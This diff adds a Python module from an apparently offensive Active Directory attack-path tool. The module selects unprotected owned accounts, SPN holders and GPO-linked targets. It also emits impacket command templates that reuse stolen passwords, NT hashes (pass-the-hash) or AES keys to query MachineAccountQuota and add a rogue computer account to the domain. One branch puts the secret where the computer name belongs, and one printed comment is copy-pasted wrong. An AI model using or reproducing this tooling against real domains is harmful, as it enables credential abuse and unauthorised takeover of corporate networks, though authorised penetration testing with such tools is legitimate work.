@@ -1,0 +1,187 @@
+from lib.database import LDAPObject, FakeLDAPObject, Owned, Database
+from lib.actionutils import *
+import lib.consts as c
+
+
+class Require():
+    def get(db:Database, parent:Owned, target:LDAPObject) -> object:
+        pass
+
+    def print(glob:dict, parent:Owned, require:dict):
+        pass
+
+
+###############################################################################
+# require_targets: return a list of LDAPObject
+# Convention: all of them are prefixed by ta_
+
+class x_ta_dc(Require):
+    def get(db:Database, parent:Owned, target:LDAPObject) -> list:
+        return [db.main_dc]
+
+
+class x_ta_users_without_admincount(Require):
+    CACHE = None
+
+    def get(db:Database, parent:Owned, target:LDAPObject):
+        if x_ta_users_without_admincount.CACHE is not None:
+            return x_ta_users_without_admincount.CACHE
+
+        ret = []
+        # iter_users contains only interesting users so it's relatively fast
+        for o in db.iter_users():
+            if not o.admincount and o.name not in db.owned_db:
+                ret.append(o)
+
+        if not ret:
+            return None
+
+        x_ta_users_without_admincount.CACHE = ret
+        return ret
+
+
+class x_ta_all_computers_in_ou(Require):
+    CACHE = {}
+
+    def get(db:Database, parent:Owned, target:LDAPObject) -> list:
+        if target.type != c.T_GPO:
+            print(f'error: the target of all_computers_in_ou must be a GPO (we have {target.name})')
+            exit(0)
+
+        if target.sid in x_ta_all_computers_in_ou.CACHE:
+            return x_ta_all_computers_in_ou.CACHE[target.sid]
+
+        ret = []
+
+        # for all links
+        for ou_dn in target.gpo_links_to_ou:
+            for sid in db.ous_by_dn[ou_dn]['members']:
+                o = db.objects_by_sid[sid]
+                if o.type == c.T_COMPUTER and o.name.upper() not in db.owned_db:
+                    ret.append(o)
+
+        x_ta_all_computers_in_ou.CACHE[target.sid] = ret
+        return ret
+
+
+class x_ta_all_users_in_ou(Require):
+    CACHE = {}
+
+    def get(db:Database, parent:Owned, target:LDAPObject) -> list:
+        if target.type != c.T_GPO:
+            print(f'error: the target of all_users_in_ou must be a GPO (we have {target.name})')
+            exit(0)
+
+        if target.sid in x_ta_all_users_in_ou.CACHE:
+            return x_ta_all_users_in_ou.CACHE[target.sid]
+
+        ret = []
+
+        # for all links
+        for ou_dn in target.gpo_links_to_ou:
+            for sid in db.ous_by_dn[ou_dn]['members']:
+                o = db.objects_by_sid[sid]
+                # db.users contains only interesting users
+                if o.type == c.T_USER and sid in db.users and \
+                       o.name.upper() not in db.owned_db and \
+                       o.sid != parent.obj.sid:
+                    ret.append(o)
+
+        x_ta_all_users_in_ou.CACHE[target.sid] = ret
+        return ret
+
+
+###############################################################################
+# Below require + require_for_auth + require_once
+# They must return a single Owned object
+
+class x_unprotected_owned_with_spn(Require):
+    def get(db:Database, parent:Owned, target:LDAPObject) -> Owned:
+        for o in db.owned_db.values():
+            if o.obj.spn and not o.obj.protected:
+                return o
+        return None
+
+    def print(glob:dict, parent:Owned, require:dict):
+        v = vars(glob, parent, target=None, required_object=require['object'])
+        comment = 'require: unprotected_owned_with_spn -> {required_object.obj.name}'
+        print_comment(comment, v)
+
+
+class x_unprotected_owned_with_spn_not_eq_parent(Require):
+    def get(db:Database, parent:Owned, target:LDAPObject) -> Owned:
+        for o in db.owned_db.values():
+            if o.obj.spn and not o.obj.protected and o.obj.sid != parent.obj.sid:
+                return o
+        return None
+
+    def print(glob:dict, parent:Owned, require:dict):
+        v = vars(glob, parent, target=None, required_object=require['object'])
+        comment = 'require: unprotected_owned_with_spn_not_eq_parent -> {required_object.obj.name}'
+        print_comment(comment, v)
+
+
+class x_owned_user_without_spn(Require):
+    def get(db:Database, parent:Owned, target:LDAPObject) -> Owned:
+        for o in db.owned_db.values():
+            if o.obj.type == c.T_USER and not o.obj.spn:
+                return o
+        return None
+
+    def print(glob:dict, parent:Owned, require:dict):
+        v = vars(glob, parent, target=None, required_object=require['object'])
+        comment = 'require: owned_user_without_spn -> {required_object.obj.name}'
+        print_comment(comment, v)
+
+
+class x_any_owned(Require):
+    def get(db:Database, parent:Owned, target:LDAPObject) -> Owned:
+        if db.owned_db:
+            return next(iter(db.owned_db.values()))
+        return None
+
+    def print(glob:dict, parent:Owned, require:dict):
+        v = vars(glob, parent, target=None, required_object=require['object'])
+        comment = 'require: owned_user_without_spn -> {required_object.obj.name}'
+        print_comment(comment, v)
+
+
+class x_add_computer(Require):
+    def get(db:Database, parent:Owned, target:LDAPObject) -> Owned:
+        obj = FakeLDAPObject()
+        obj.type = c.T_COMPUTER
+        obj.name = c.NEW_DESKTOP
+        obj.spn = ['HOST/' + obj.name.replace('$', '')]
+        return Owned(obj, secret=c.NEW_DESKTOP_PASS, secret_type=c.SECRET_PASSWORD)
+
+    def print(glob:dict, parent:Owned, require:dict):
+        v = vars(glob, parent, target=None, required_object=require['object'])
+
+        comment = [
+            'Check if the machine account quota is > zero, otherwise this scenario will',
+            'not work (try with --opt noaddcomputer)',
+        ]
+
+        if parent.krb_auth:
+            cmd = "./getname.py '{fqdn}/{parent.obj.name}@{dc_name}' -dc-ip {dc_ip} -k -t {domain_short_name} | grep MachineAccountQuota"
+        elif parent.secret_type == c.SECRET_NTHASH:
+            cmd = "./getname.py '{fqdn}/{parent.obj.name}@{dc_name}' -dc-ip {dc_ip} -hashes :{parent.secret} -t {domain_short_name} | grep MachineAccountQuota"
+        elif parent.secret_type == c.SECRET_AESKEY:
+            cmd = "./getname.py '{fqdn}/{parent.obj.name}@{dc_name}' -dc-ip {dc_ip} -k -aesKey {parent.secret} -t {domain_short_name} | grep MachineAccountQuota"
+        elif parent.secret_type == c.SECRET_PASSWORD:
+            cmd = "./getname.py '{fqdn}/{parent.obj.name}:{parent.secret}@{dc_name}' -dc-ip {dc_ip} -t {domain_short_name} | grep MachineAccountQuota"
+
+        print_line(comment, cmd, v)
+
+        comment = 'Add a computer in the domain'
+
+        if parent.krb_auth:
+            cmd = "addcomputer.py '{fqdn}/{parent.obj.name}' -dc-ip {dc_ip} -k -no-pass -computer-name '{required_object.obj.name}' -computer-pass '{required_object.secret}' -method SAMR"
+        elif parent.secret_type == c.SECRET_NTHASH:
+            cmd = "addcomputer.py '{fqdn}/{parent.obj.name}' -dc-ip {dc_ip} -hashes :{parent.secret} -computer-name '{required_object.secret}' -computer-pass '{required_object.secret}' -method SAMR"
+        elif parent.secret_type == c.SECRET_AESKEY:
+            cmd = "addcomputer.py '{fqdn}/{parent.obj.name}' -dc-ip {dc_ip} -k -no-pass -aesKey {parent.secret} -computer-name '{required_object.obj.name}' -computer-pass '{required_object.secret}' -method SAMR"
+        elif parent.secret_type == c.SECRET_PASSWORD:
+            cmd = "addcomputer.py '{fqdn}/{parent.obj.name}:{parent.secret}' -dc-ip {dc_ip} -computer-name '{required_object.obj.name}' -computer-pass '{required_object.secret}' -method SAMR"
+
+        print_line(comment, cmd, v)
